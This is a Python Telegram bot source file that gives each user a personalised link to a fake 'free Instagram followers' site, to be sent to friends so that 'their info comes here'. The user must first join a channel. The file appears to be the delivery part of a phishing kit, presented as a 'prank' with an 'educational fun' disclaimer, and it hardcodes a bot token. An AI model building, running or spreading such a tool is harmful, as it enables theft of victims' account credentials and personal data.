from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import CommandHandler, CallbackQueryHandler, CallbackContext, Updater

BOT_TOKEN = '8421347465:AAHhz3e3B3KGiVUhvAFPar1G7teacTqBmEQ'
CHANNEL_USERNAME = 'https://t.me/freefollowers_28'
NETLIFY_BASE_URL = 'https://free-followersinsta.netlify.app'

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ Bot is Running - Team Tasmina"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    Thread(target=run).start()

# ✅ Check if user is in the Telegram channel
def is_user_member(context, user_id):
    try:
        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# 🎯 Send link after accepting and verification
def send_prank_link(context, chat_id, name, user_id):
    prank_link = f"{NETLIFY_BASE_URL}/?userid={user_id}"
    text = (
        f"🎉 Welcome {name}!\n\n"
        "🔐 *Disclaimer from Team Tasmina:*\n"
        "This tool is created just for educational fun. Please do not misuse it.\n\n"
        f"🔗 *Your prank link (copy it):*\n`{prank_link}`\n\n"
        "📤 Send this to your friends. If they fall for it, their info comes here 😄"
    )

    context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Link", url=prank_link)]
        ])
    )

# 🟢 /start command
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    name = update.effective_user.first_name

    update.message.reply_text(
        f"👋 Hello *{name}*, welcome to the Insta Tool Bot by *Team Tasmina*!",
        parse_mode='Markdown'
    )

    update.message.reply_text(
        "⚠️ *Before you begin...*\n\n"
        "You must accept our *Terms & Conditions*. This tool is for fun only.\n\n"
        "Do you agree to use it responsibly?",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Accept & Continue", callback_data="accept_terms_start")]
        ])
    )

# ✅ After accepting Terms
def accept_terms_start(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text(
            f"🚫 {name}, please join our Telegram channel first:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
                [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]
            ])
        )

# 🔄 After clicking "I Joined"
def check_join(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text("❌ You are still not a member. Please join the channel first.")

# 🚀 Start everything
def main():
    keep_alive()
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(accept_terms_start, pattern="accept_terms_start"))
    dp.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
